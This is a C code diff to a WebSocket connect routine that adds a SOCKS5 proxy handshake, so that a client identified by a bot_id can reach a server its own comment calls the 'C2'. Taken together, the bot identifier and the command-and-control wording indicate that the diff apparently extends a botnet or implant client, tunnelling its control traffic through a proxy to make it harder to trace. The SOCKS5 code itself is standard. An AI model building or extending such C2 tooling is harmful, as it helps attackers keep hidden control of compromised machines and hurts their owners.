@@ -174,13 +174,63 @@ int ws_connect(WS *ws, const char *bot_id)
     setsockopt(ws->sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     setsockopt(ws->sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 
-    if (connect(ws->sockfd, res->ai_addr, res->ai_addrlen) < 0) {
-        close(ws->sockfd);
-        ws->sockfd = -1;
+    /* SOCKS5 proxy: connect to proxy first, then tunnel to C2 */
+    if (ws->socks5[0]) {
+        struct addrinfo ph = {0}, *pres = NULL;
+        char phost[256], pport[8], *psep = strchr(ws->socks5, ':');
+        if (!psep) { close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1; }
+        size_t hlen = (size_t)(psep - ws->socks5);
+        if (hlen >= sizeof(phost)) hlen = sizeof(phost) - 1;
+        memcpy(phost, ws->socks5, hlen); phost[hlen] = 0;
+        snprintf(pport, sizeof(pport), "%d", atoi(psep + 1));
+
+        if (getaddrinfo(phost, pport, &ph, &pres) != 0) {
+            close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1;
+        }
+        if (connect(ws->sockfd, pres->ai_addr, pres->ai_addrlen) < 0) {
+            close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(pres); freeaddrinfo(res); return -1;
+        }
+        freeaddrinfo(pres);
+
+        /* SOCKS5 greeting: ver=5, nmethods=1, no-auth=0 */
+        unsigned char g[3] = {0x05, 0x01, 0x00};
+        if (send(ws->sockfd, g, 3, 0) != 3) { close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1; }
+        unsigned char gr[2];
+        if (recv(ws->sockfd, gr, 2, MSG_WAITALL) != 2 || gr[0] != 0x05) {
+            close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1;
+        }
+        /* SOCKS5 connect request: ver=5, cmd=1, rsv=0, atyp=3 (domain), domain, port */
+        struct sockaddr_in *target = (struct sockaddr_in *)res->ai_addr;
+        char domain[256];
+        strncpy(domain, ws->host, sizeof(domain) - 1);
+        domain[sizeof(domain) - 1] = 0;
+        int dlen = (int)strlen(domain);
+        uint16_t tport = htons((uint16_t)ws->port);
+        unsigned char cr[512];
+        int clen = 0;
+        cr[clen++] = 0x05; cr[clen++] = 0x01; cr[clen++] = 0x00;
+        cr[clen++] = 0x03; cr[clen++] = (unsigned char)dlen;
+        memcpy(cr + clen, domain, dlen); clen += dlen;
+        memcpy(cr + clen, &tport, 2); clen += 2;
+        if (send(ws->sockfd, cr, clen, 0) != clen) {
+            close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1;
+        }
+        unsigned char reply[256];
+        int rl = recv(ws->sockfd, reply, sizeof(reply), 0);
+        if (rl < 2 || reply[0] != 0x05 || reply[1] != 0x00) {
+            close(ws->sockfd); ws->sockfd = -1; freeaddrinfo(res); return -1;
+        }
+        /* Tunnel established — SSL/WS will go through proxy */
         freeaddrinfo(res);
-        return -1;
+    } else {
+        if (connect(ws->sockfd, res->ai_addr, res->ai_addrlen) < 0) {
+            close(ws->sockfd);
+            ws->sockfd = -1;
+            freeaddrinfo(res);
+            return -1;
+        }
+        freeaddrinfo(res);
     }
-    freeaddrinfo(res);
 
     ws->rbuf_len = 0;
     ws->rbuf_off = 0;
